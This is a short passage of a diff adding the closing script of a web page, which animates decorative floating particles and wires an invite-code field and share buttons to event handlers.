+                p.className = 'particle';
+                p.style.cssText = `left:${Math.random()*100}%;top:${Math.random()*100}%;width:${Math.random()*6+2}px;height:${Math.random()*6+2}px;opacity:${Math.random()*0.7+0.2};animation:float ${10+Math.random()*20}s linear infinite;animation-delay:-${Math.random()*20}s;`;
+                document.getElementById('particles').appendChild(p);
+                if (i === 0) {
+                    const s = document.createElement('style');
+                    s.textContent = `@keyframes float{0%{transform:translateY(0)translateX(0)rotate(0deg);opacity:0}10%{opacity:0.4}90%{opacity:0.4}100%{transform:translateY(-100vh)translateX(${(Math.random()-0.5)*200}px)rotate(${Math.random()*360}deg);opacity:0}}`;
+                    document.head.appendChild(s);
+                }
+            }
+
+            document.getElementById('inviteCodeInput').addEventListener('keypress', e => e.key === 'Enter' && validateInviteCode());
+            document.getElementById('submitCodeBtn').addEventListener('click', validateInviteCode);
+            document.getElementById('shareBtn').addEventListener('click', handleShare);
+            document.getElementById('finalShareBtn').addEventListener('click', handleShare);
+        });
+    </script>
+</body>
+</html>
